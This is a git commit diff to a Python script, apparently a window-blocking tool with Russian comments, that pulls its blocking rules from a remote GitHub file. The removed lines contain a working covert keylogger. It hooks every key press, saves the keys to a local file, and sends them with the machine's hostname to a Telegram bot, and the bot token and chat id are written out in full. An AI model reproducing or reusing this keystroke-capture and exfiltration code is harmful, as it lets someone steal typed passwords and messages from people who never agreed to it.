79602267aa3f9748feed2e4e700068526aa1ab24
boingo0 <154893481+boingo0@users.noreply.github.com>
2025-06-02 22:53:02 +0700

    Update main.py

--- main.py
+++ main.py
@@ -28,15 +28,12 @@ def import_plys(lib_import, lib):
                         except:print('error 1')
 
 # Импортируем библеотеки
-try:from keyboard import on_press
-except:import_plys('from keyboard import read_key','keyboard')
 try:from pygetwindow import getWindowsWithTitle, getAllTitles
 except:import_plys('from pygetwindow import getWindowsWithTitle, getAllTitles','pygetwindow')
 try:from glob import glob
 except:import_plys('from glob import glob','glob')
 try:from requests import get
 except:import_plys('from requests import get',"requests")
-from keyboard import read_key
 from pygetwindow import getWindowsWithTitle, getAllTitles
 from requests import get
 from socket import gethostname
@@ -45,39 +42,18 @@ print(1)
 
 
 
-
-#Отпровляем данные с клавиатуры мне на телеграмм
-try:
-    with open("data.txt") as file:
-        get(f'https://api.telegram.org/bot6645471267:AAGxIThmeQAxknl7bThuj5IzniwCqtB7MII/sendMessage?chat_id=5311448115&text={gethostname()}    {str(file.read())}')
-except FileNotFoundError:
-    with open("data.txt",'w') as file:pass
-    data = f"{gethostname()} подключено новое устройство"
-    get(f'https://api.telegram.org/bot6645471267:AAGxIThmeQAxknl7bThuj5IzniwCqtB7MII/sendMessage?chat_id=5311448115&text={str(data)}')
-
 #получаем данные о блокеровках
 blok_data = str(get('https://raw.githubusercontent.com/boingo0/sssss/refs/heads/main/hg').text).split('&#&')
 bloks = blok_data[1:]
 bloks_data = blok_data[0]
 print(2)
 #главный цикл
-text = [round(tm(), 2)]
 update_key = 2
-on_press(lambda x:text.append((str(x.name), round(tm()-text[0], 2))))
 while 1:
     blok_data = str(get('https://raw.githubusercontent.com/boingo0/sssss/refs/heads/main/hg').text).split('&#&')
     for i in range(10):
         bloks = blok_data[1:]
         bloks_data = blok_data[0]
-        #берём данные с клавиатуры
-        print(text)
-        if len(text) >= update_key:
-            update_key = update_key+1
-            with open("data.txt", 'w') as file:
-                file.write(str(text))
-            try:
-                get(f'https://api.telegram.org/bot6645471267:AAGxIThmeQAxknl7bThuj5IzniwCqtB7MII/sendMessage?chat_id=5311448115&text={gethostname()}    {str(text)}')
-            except:pass
         print(bloks_data)
         #Часть отвечаючея за блокеровку
         if bloks_data[0] == "1":
